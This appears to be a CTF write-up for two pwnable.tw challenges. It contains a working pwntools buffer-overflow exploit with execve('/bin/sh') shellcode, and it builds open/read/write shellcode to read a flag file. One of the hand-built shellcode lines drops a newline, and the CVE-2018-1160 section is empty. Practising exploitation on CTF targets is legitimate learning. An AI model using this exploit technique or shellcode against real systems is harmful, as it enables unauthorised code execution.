# pwn.tw

## 01 start
checksec, RWX segment existed. maybe shellcode can be used.

a ASM program, calling some sys_call, like `sys_write`/`sys_read`.
and reading process is a BOF vulnerability, length of buffer is enough for a simple ROP.
hijack the second argu of `sys_write` to print out the stack info, then ret2shellcode.

```py
#!/bin/python3

from pwn import *

# io = process("./start")
# gdb.attach(io, 'b*0x08048087\nc')
io = remote("chall.pwnable.tw", 10000)

payload = b''
payload += b'A' *20
payload += p32(0x08048087)

io.sendafter(b'CTF:', payload)

stack_addr = u32(io.recv(4))
buf_addr = stack_addr - 4

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"

payload2 = b''
payload2 += b'A'*20
payload2 += p32(buf_addr + 20 +4 )
payload2 += shellcode

io.sendline(payload2)

io.interactive()
```

## 02 orw

a shellcode challenage, but syscalls we can use is limited to open/read/write.

we can not launch a shell directly, but these three calls are enough to read a flag with known path (which is provided by the hint).

we will open the flag and read it to buffer, and write it to stdout.

man syscalls and `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`:
```
int open(const char *pathname, int flags);		#define __NR_read 3
ssize_t read(int fd, void *buf, size_t count);		#define __NR_open 5
ssize_t write(int fd, const void *buf, size_t count);	#define __NR_write 4

path is `/home/orw/flag`, 14 bytes.
```
- pwntools
	- pwnlib.shellcraft
		```py
		shellcraft.i386.pushstr('/home/orw/flag')
		shellcraft.i386.linux.syscall('SYS_open', 'esp')
		shellcraft.i386.linux.syscall('SYS_read', 'eax', 'esp', 0x50)
		shellcraft.i386.linux.syscall('SYS_write', 1, 'esp', 0x50)
		```
		that is:	
		```
		push '/home/orw/flag\x00'
		call open('esp')
		call read('eax', 'esp', 0x50)
			// eax is previous call's ret value, which is opened fd.
		call write(1, 'esp', 0x50)
		```
- asm
	- argu:
		- eax: calling num
		- ebx/ecx/edx/esi/edi: argu1/2/3/4/5
	- crafting:
		- push '/home/orw/flag\x00'
		```
		'///h' <-esp
		'ome/'
		'orw/'
		'flag'
		'\x00'
		```
		crafting the asm code:
		
		```py
		shellcode = ''
		shellcode += 'xor eax, eax\n push eax\n'
		
		temp = hex(u32(b'flag'))
		shellcode += 'push '+ temp + '\n'

		temp = hex(u32(b'orw/'))
		shellcode += 'push '+ temp + '\n'
		
		temp = hex(u32(b'ome/'))
		shellcode += 'push '+ temp + '\n'
		
		temp = hex(u32(b'///h'))
		shellcode += 'push '+ temp + '\n'
		```

		- call `open('esp')`
			- eax: 5
			- ebx: buf(esp)
			- call
		
		```py
		shellcode += 'push 0x5\n pop eax\n'
		shellcode += 'mov ebx, esp\n'
		shellcode += 'int 0x80\n'
		```
		
		- call `read('eax', 'esp', 0x50)`
			- eax: 3
			- ebx: eax(fd)
			- ecx: esp(buf)
			- edx: 0x50(len)
		
		```py
		shellcode += 'mov ebx, eax\n'
		shellcode += 'push 0x3\n pop eax\n'
		shellcode += 'mov ecx, esp\n'
		shellcode += 'push 0x50\n pop edx'
		shellcode += 'int 0x80\n'
		```

		... omitted...

## 03 CVE-2018-1160

